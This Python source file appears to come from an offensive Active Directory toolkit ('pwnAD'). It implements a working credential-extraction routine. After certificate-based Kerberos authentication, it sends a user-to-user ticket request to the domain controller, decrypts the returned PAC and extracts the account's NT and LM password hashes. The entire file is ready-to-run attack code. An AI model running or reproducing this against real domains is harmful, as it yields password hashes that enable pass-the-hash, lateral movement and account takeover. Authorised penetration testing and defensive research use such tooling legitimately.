import datetime
from random import getrandbits

from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from pwnAD.lib.logger import logging
from pwnAD.commands.getTGT import getTGT


def getNThash(auth, is_key_credential=False):

    if not (auth.cert and auth.key):
        return logging.error("getNThash function needs certificate authentication")
    as_rep, cipher, session_key, t_key = getTGT(auth)
    logging.info(f"Trying to retrieve NT hash for {auth.username}")

    # Try to extract NT hash via U2U
    # https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
    # AP_REQ
    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    ap_req["ap-options"] = constants.encodeFlags(opts)

    ticket = Ticket()
    ticket.from_asn1(as_rep["ticket"])

    seq_set(ap_req, "ticket", ticket.to_asn1)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5

    authenticator["crealm"] = bytes(as_rep["crealm"])

    client_name = Principal()
    client_name.from_asn1(as_rep, "crealm", "cname")

    seq_set(authenticator, "cname", client_name.components_to_asn1)

    now = datetime.datetime.utcnow()
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)

    encoded_authenticator = encoder.encode(authenticator)

    encrypted_encoded_authenticator = cipher.encrypt(
        session_key, 7, encoded_authenticator, None
    )

    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

    encoded_ap_req = encoder.encode(ap_req)

    # TGS_REQ
    tgs_req = TGS_REQ()

    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
    )
    tgs_req["padata"][0]["padata-value"] = encoded_ap_req

    req_body = seq_set(tgs_req, "req-body")

    opts = []
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.canonicalize.value)
    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable_ok.value)

    req_body["kdc-options"] = constants.encodeFlags(opts)

    server_name = Principal(
        auth.username, type=constants.PrincipalNameType.NT_UNKNOWN.value
    )

    seq_set(req_body, "sname", server_name.components_to_asn1)

    req_body["realm"] = str(as_rep["crealm"])

    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

    req_body["till"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = getrandbits(31)
    seq_set_iter(
        req_body,
        "etype",
        (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
    )

    ticket = ticket.to_asn1(TicketAsn1())
    seq_set_iter(req_body, "additional-tickets", (ticket,))
    message = encoder.encode(tgs_req)

    tgs = sendReceive(message, auth.domain, auth.dc_ip)

    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

    ciphertext = tgs["ticket"]["enc-part"]["cipher"]

    new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]

    plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
    special_key = Key(18, t_key)

    data = plaintext
    enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
    ad_if_relevant = decoder.decode(
        enc_ticket_part["authorization-data"][0]["ad-data"],
        asn1Spec=AD_IF_RELEVANT(),
    )[0]
    pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
    buff = pac_type["Buffers"]

    nt_hash = None
    lm_hash = "aad3b435b51404eeaad3b435b51404ee"

    for _ in range(pac_type["cBuffers"]):
        info_buffer = PAC_INFO_BUFFER(buff)
        data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
            : info_buffer["cbBufferSize"]
        ]
        if info_buffer["ulType"] == 2:
            cred_info = PAC_CREDENTIAL_INFO(data)
            new_cipher = _enctype_table[cred_info["EncryptionType"]]
            out = new_cipher.decrypt(
                special_key, 16, cred_info["SerializedData"]
            )
            type1 = TypeSerialization1(out)
            new_data = out[len(type1) + 4 :]
            pcc = PAC_CREDENTIAL_DATA(new_data)
            for cred in pcc["Credentials"]:
                cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                    b"".join(cred["Credentials"])
                )
                if any(cred_structs["LmPassword"]):
                    lm_hash = cred_structs["LmPassword"].hex()
                nt_hash = cred_structs["NtPassword"].hex()
                break
            break

        buff = buff[len(info_buffer) :]
    else:
        logging.error("Could not find credentials in PAC")
        return False

    if not is_key_credential:
        logging.info(f"Got NThash for {auth.username}: {nt_hash}")

    return nt_hash